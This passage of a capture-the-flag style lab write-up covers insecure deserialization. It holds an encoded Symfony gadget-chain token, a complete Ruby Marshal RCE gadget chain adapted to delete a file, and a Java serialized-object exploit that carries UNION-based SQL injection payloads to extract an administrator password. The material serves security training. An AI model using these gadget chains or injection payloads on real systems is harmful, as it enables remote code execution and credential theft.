`%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%228d97485c3c800e740fad40941f854b45900facb3%22%7D`

I put this on the session cookie, and send the request. I got a `500 Internal Server Error` but the code was executed and the lab is solved.

----------

### Working with documented gadget chains

Not always there are dedicated tools available for exploiting known gadget chains in the framework which is used by the target app.

So, it's worth looking online to see for any documented exploits, and then adopt manually.

#### Lab.8 Exploiting Ruby deserialization using a documented gadget chain

**Description**
The lab uses a serialization-based session mechanism and the `Ruby on Rails` framework.

There are documented exploits that enable RCE via a gadget chain.

The goal of the lab is to find a documented exploit and adapt it to create a serialized object containing RCE payload, then pass this object into the website and delete the `morale.txt` from the Carlos's home directory.

`wiener:peter` can be used to login.

**Solution**
Login with the credentials provided, and send the request to the `my-account` to the Burp Repeater.

Since the site uses ruby, let's search on internet for a gadget chain payload.

I took the one from `devcraft.io`.

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
puts Marshal.load(payload)
```

This executes the `id` command so change that with the `rm /home/carlos/morale.txt`, and also make it encode the payload on base64 by adding `puts Base64.encode64(payload)`.

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)

```


This payload threw some errors for not being able to run the Base64 function, so I had to edit it further into this:

```ruby
require 'base64'
require 'net/http'
require 'rubygems/package'

# Prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

# Gadget: Create a WriteAdapter targeting Kernel#system
wa1 = Net::WriteAdapter.new(Kernel, :system)

# Create a Gem::RequestSet object and craft it
rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

# Gadget: Create another WriteAdapter for Gem::RequestSet#resolve
wa2 = Net::WriteAdapter.new(rs, :resolve)

# Create a Gem::Package::TarReader::Entry object and craft it
i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

# Create a Net::BufferedIO object and craft it
n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

# Create a Gem::Package::TarReader object and craft it
t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

# Craft the Gem::Requirement object
r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

# Craft the payload with Gem::SpecFetcher and Gem::Installer
payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```

When I executed this, it provided with a base64 as expected:

```base64
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
```

When added to the session cookie, and sent a `GET` request, the response was a `HTTP/2 500 Internal Server Error`, but the file was deleted, and the lab solved.


-------------

### Creating your own exploit

When gadget chains and documented exploits are unsuccessful, you need to create your own exploit.

For this, you almost certainly need source code access.

First step -> identify a class that contains a magic method that is invoked during deserialization.

Assess the code that is executed by it, to see if it directly does anything dangerous with user-controllable attributes.

If the magic method is not exploitable -> can serve as a `kick-off gadget` on the gadget chain.

Study the methods that this kick-off gadget invokes, if any of them does something dangerous with data that you control.

If not -> study the methods they invoke. And so on, until you reach a dead end or identify a dangerous sing gadget into which your controllable data is passed.

If you constructed a successful gadget chain -> create a serialized object containing the payload.

Binary format -> when making minor changes, you have to be comfortable working directly with the bytes, but significant changes like passing a new object, it becomes impractical. Simpler -> write your own code in the target language in order to generate and serialize the data yourself.

#### Lab.8 Developing a custom gadget chain for Java deserialization

**Description**
Serialization-based session mechanism. The goal is to get access to the source code and use it to construct a gadget chain to obtain `administrator` password, and then delete `carlos`.

`wiener:peter` can be used to login.

**Solution**
First I login to the lab with the `wiener:peter` credentials, and send the `GET /my-account?id=wiener` request to the repeater.

There I see the session-cookie:
`rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACB0eHUzaXJnMGo4dDQ2amp5eXU5NTN1NDNremZmZXM4dnQABndpZW5lcg%3d%3d`

I send it to decoded to decode it from URL-encoding and then from base64-encoding.

The result is:
`¬¨√≠ sr /lab.actions.common.serializable.AccessTokenUserQ√º√•'¬©¬Å L accessTokent Ljava/lang/String;L usernameq ~ xpt  txu3irg0j8t46jjyyu953u43kzffes8vt wiener`

Which tells me that the session cookie is made by using the `accessToken` object.

Let's analyze the site to see if we can find any access to the source code.

 I right click on the request on the repeater, and click `Engagement Tools` then `Discover content`, and start a new session.

Then in the `Site map`, I see there a `backup` folder which contains two files:
- AccessTokenUser.java
- ProductTemplate.java

I send them both to the Repeater, and I got access to both source codes.

```java
package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
}
```

```java
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

In the second code, there is some SQL statements which can be vulnerable to sql injection, and also I can pass a an `id` to it.

So, the goal would be to use this object and serialize it, in order to try and retrieve the credentials for `administrator`.

I will be using also the following Java code provided by the `Portswigger`, to serialize the object:

```java
import data.Foo;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class Main {
    public static void main(String[] args) throws Exception {
        Foo originalObject = new Foo("str", 123);

        String serializedObject = serialize(originalObject);

        System.out.println("Serialized object: " + serializedObject);

        Foo deserializedObject = deserialize(serializedObject);

        System.out.println("Deserialized data str: " + deserializedObject.str + ", num: " + deserializedObject.num);
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
```

The code above should be modified to work with our `ProductTemplate` code, and serialize it instead of some `Foo` object. 

```java
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

import data.productcatalog.ProductTemplate;

class Main {
    public static void main(String[] args) throws Exception {
        ProductTemplate pt = new ProductTemplate(" sql code here");        
        String serializedObject = serialize(pt);

        System.out.println("Serialized object: " + serializedObject);

        ProductTemplate deserializedObject = deserialize(serializedObject);

        System.out.println("Deserialized object ID: " + deserializedObject.getId());
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
```

Also some unnecessary code has been removed from `Product Template` , as the important thing is what changes in the app. 

The removed part remains static, and we are interested only in the input here which is the sql statement.

```java
package data.productcatalog;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }
    public String getId()
    {
        return id;
    }

}
```

Note that it is important to keep the structure of the `ProductTemplate` app, as for example the packages where the files are `data.productcatalog.ProductTemplate`.

Let's try some sql code, and see what happens in the output:

```sql
"' UNION SELECT OR 1=1 --"
```

After running the java app, we will get a serialized base64 encoded cookie, so just copy that and paste in the session cookie in Burp and send the request.

And the result is an error, from which we don't get too much:
![Pasted_image_20250128141103](https://github.com/user-attachments/assets/4376fb52-a22e-4a4c-9452-5b9851488be3)

By providing the following `"'"` sql code, we the full sql query executed in the backend, which we saw also on the `ProductTemplate.java`:
![Pasted_image_20250128141237](https://github.com/user-attachments/assets/33f9e90d-3b88-46b2-8123-6c93dd61240e)

I will try to get the number of columns, which is very important in order to proceed with the sql injection.

For this I have to brute-force by adding a `NULL`, and looking up the response:

```sql
"' UNION SELECT NULL --"
```

From the answer we see that it should have more than one colum:
![Pasted_image_20250128141704](https://github.com/user-attachments/assets/744584a6-c487-4cbe-9859-4eed0335c68c)


I brute-forced it until I got a different error. This happened when I injected 8 NULL's which tells me that it has 8 columns.

```sql
"' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --"
```
![Pasted_image_20250128141858](https://github.com/user-attachments/assets/04490901-c920-46c2-b938-d3bae8f618b5)

Now I need to find out the data types of some of the columns, and for this I brute-forced again, by putting an `'a'` in each column, until I found out that the 4th column is an integer.

```sql
"' UNION SELECT NULL, NULL, NULL, 'a', NULL, NULL, NULL, NULL --"
```
![Pasted_image_20250128142221](https://github.com/user-attachments/assets/b24fa005-2602-4f19-8751-16db03de93fd)

Now, I will use this column to get the name of the table, by using the `information_schema`.

```sql
"' UNION SELECT NULL, NULL, NULL, CAST(table_name as numeric), NULL, NULL, NULL, NULL FROM information_schema.tables --"
```

And now I see that the name of the table is `users`.

![Pasted_image_20250128142417](https://github.com/user-attachments/assets/c77bb3bf-0046-4b12-92a3-eddf0eb14dee)

Let's get now the name of the column name from the table users.

```sql
"' UNION SELECT NULL, NULL, NULL, CAST(column_name as numeric), NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users' --"
```
![Pasted_image_20250128142617](https://github.com/user-attachments/assets/3de88a2f-3d8b-45bd-82a8-36e0149f2811)

After this, let's see the name of the users.

```sql
"' UNION SELECT NULL, NULL, NULL, CAST(username as numeric), NULL, NULL, NULL, NULL FROM users --"
```

The username `administrator` now is confirmed.

![Pasted_image_20250128142739](https://github.com/user-attachments/assets/3028429f-40ac-4607-97bf-31653a769586)

Last step here is to get the password:

```sql
"' UNION SELECT NULL, NULL, NULL, NULL, CAST(password as numeric), NULL, NULL, NULL FROM users --"
```
![Pasted_image_20250128143740](https://github.com/user-attachments/assets/b01d6d7a-9d7c-43fd-a05b-10b40ecfeb70)

And the password is: `njc48q6f5rmpcuakbkzt`.

Now, I use this password to login and delete the user `carlos` and the lab is solved.

----------


